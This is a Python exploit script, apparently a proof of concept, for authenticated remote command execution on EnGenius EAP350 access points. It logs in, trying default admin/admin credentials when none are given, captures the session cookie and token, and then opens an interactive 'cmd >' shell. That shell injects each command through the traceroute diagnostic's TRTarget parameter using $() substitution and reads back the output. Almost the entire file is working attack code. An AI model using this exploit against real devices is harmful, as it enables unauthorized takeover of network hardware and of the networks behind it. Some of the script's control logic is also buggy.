#!/usr/bin/python3
"""
    ToDo :
    # add exploit for ping point and test other features and add its exploits.
    print(Fore.YELLOW+"
    ->  [ Attack Endpoints EAP350 AccessPoints ]
    \t1) TraceRoute Feature
    \t2) Ping Feature
    \t3) ..... ! need furtehr assesments
    ")
    choice = input(Fore.GREEN+"[+] choice : "+Fore.RED)
    if choice == 1 :
        main_tr_endpoint()
    elif choice == 2 :
        print("[+] ping under development")
    elif choice == 3 :
        print("[+] further research leads to further exploits")
    else :
        print(Fore.YELLOW+"["+Fore.RED+"!"+Fore.YELLOW+"] "+ Fore.RED +"Wrong Choice ... ")
    """
import argparse
from phonenumbers import expected_cost
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore
import os
import sys

init(autoreset=True)

success = "stok"
bad = " Invalid username and/or password!s"
forbidden = "403"

def banner():
    print(Fore.GREEN + """ 
                                                                                                                    
        ████▓▓                                                                    
        ██  ██                                                                    
        ▓▓  ██                                                                    
        ██  ██                                                                    
        ██  ██                                                                    
        ██  ██                                                                    
       ▒▒████▓▓████████████████████████████████████████▓▓▒▒                            
       ██                                                ██                            
       ██                                  ▓▓      ▓▓    ██                            
       ██    ▓▓██░░  ▓▓██                    ██  ██      ██                            
       ██    ██  ██  ▓▓  ██                    ██        ██                            
       ██    ████▓▓  ████▒▒                  ▒▒▓▓██      ██                            
       ██                                ▓▓▓▓▓▓██████▓▓  ██                            
       ██                                ▒▒▓▓  ██  ██    ██                            
       ██▒▒▒▒▒▒░░▒▒░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒    ██  ██  ██  ████                            
                                         ▓▓██  ██  ██▓▓                                
                                           ██  ██  ██                                  
                                         ▓▓██  ██  ██▓▓                                
                                             ██▓▓██                                    
                                                                                             
          ______        _____            _           
         |  ____|      / ____|          (_)          
         | |__   _ __ | |  __  ___ _ __  _ _   _ ___ 
         |  __| | '_ \| | |_ |/ _ \ '_ \| | | | / __|
         | |____| | | | |__| |  __/ | | | | |_| \__ \\
         |______|_| |_|\_____|\___|_| |_|_|\__,_|___/                           
                                        ACCESSPOINTS
"""+"\n"+Fore.RED + "[ Authenticated RCE , works on devices !updated before Feb 2022  ]\n[ EAP350 AccessPoints ] "          
 )
def Login():
    print(Fore.YELLOW+"[+] Checking Credentials ...")
    logindata = "page=login" +"&username="+ username + "&password="+ password
    target = "http://"+ip+"/cgi-bin/luci/"
    #print(target,logindata)
    custom_headers = {
        "Content-Length": "40",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://"+ip,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Referer": "http://"+ip+"/cgi-bin/luci",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
}
    session = requests.Session()
    login_def = session.post(target, headers=custom_headers,data=logindata)
    if  login_def.status_code == 200 :
        print(Fore.GREEN + "[+] Logged in!")
        login_cookie = session.cookies.get_dict()
        sysauth= login_cookie['sysauth']
        soup = BeautifulSoup(login_def.text, 'html.parser')
        stok_data = str(soup.find_all('frame')[len(soup.find_all('frame'))-1]).split(";")[1].split("/")[0].split("=")[1]
        shell(sysauth,stok_data,custom_headers)
        
    elif login_def.status_code == 201:
        print(Fore.RED + "[-] Failed to login with default credentials!")
        exit(1)

def shell(auth_token, stok, head):
    print(Fore.LIGHTGREEN_EX+"[+] Cookie : ",auth_token)
    print(Fore.LIGHTGREEN_EX+"[+] stok : ",stok)
    head_cmd = {
        "pgrade-Insecure-Requests": "1" , 
        "User-Agent": head["User-Agent"] , 
        "Accept": head["Accept"] ,
        "Referer": "http://"+ip+"/cgi-bin/luci/;stok="+stok+"/html/Diagnostics",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "sysauth="+ auth_token,
        "Connection": "close"
    }
    while True :
        cmd = input(Fore.RED + "cmd > "+ Fore.WHITE)
        if cmd == "" :
            cmd = "id"
            print("[+] Taking default command : ",cmd)
        elif cmd == "clear" :
            os.system("clear")
            continue
            
        cmdurl = head_cmd["Referer"]+"Results?&actionDiagnosticslink=1&type=1&actionTraceroute=1&TRTarget=$("+cmd+")" 
        send_cmd = requests.get(cmdurl, headers = head_cmd)
        if send_cmd.status_code == 200 :
            recv_head = {
                "User-Agent": head["User-Agent"] ,
                "Accept": "*/*",
                "Referer": "http://"+ip+"/cgi-bin/luci/;stok="+stok+"/html/DiagnosticsResults?&actionDiagnosticslink=1&type=1&actionTraceroute=1&TRTarget="+ip,
                "Accept-Encoding": "gzip, deflate" ,
                "Accept-Language": "en-US,en;q=0.9" ,
                "Cookie": "sysauth="+auth_token,
                "Connection": "close"
            }
            attack = "http://"+ip+"/cgi-bin/luci/;stok="+stok+"/html/TracerouteResult?&r=1"
            receive_exec_data = requests.get(attack, headers = recv_head)
            print(receive_exec_data.text.split("'")[1])

def main_tr_endpoint() :
    global ip,username,password
    username, password, ip = "","",""
    parser = argparse.ArgumentParser(prog="EAP350.py",description="Authenticated RCE in EAP350 Accesspoints")
    # Argument Parser
    parser.add_argument("-t","--Target",required=True,help="Target IP address")
    parser.add_argument("-u","--User",help="username for Engenius Login")
    parser.add_argument("-p","--Passwd",help="Password For Engenius Login")
    args = parser.parse_args()
    ip = args.Target
    username = args.User
    password = args.Passwd
    # if username and password are not provided trying the exploit with the default creds   
    if username == None :
        username = "admin"
    if password == None :
        password = "admin"
    try:
        print(Fore.CYAN + "[+] Checking Connection to the target Engenius application. IP : {}".format(ip))
        login = requests.get("http://{}/cgi-bin/luci".format(ip))
        if login.status_code == 404:
            print(Fore.RED + "[!] Target Unreachable....")
            exit(1)
        if bad or forbidden in login.text:
            Login()
        if success in login.text:
            shell()
        if login.status_code == 403:
            print(Fore.RED + "[!] 403: too many requests, come back later!")
            exit(1)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "[-] An error occurred ... %s" % e)
        exit(1)
try :
    banner()
    main_tr_endpoint()
    
except KeyboardInterrupt:
    print(Fore.RED+"\n[!] Keyboad Interuppt Occured ...\n\t bye;;;...bye !!!")
    sys.exit(0)
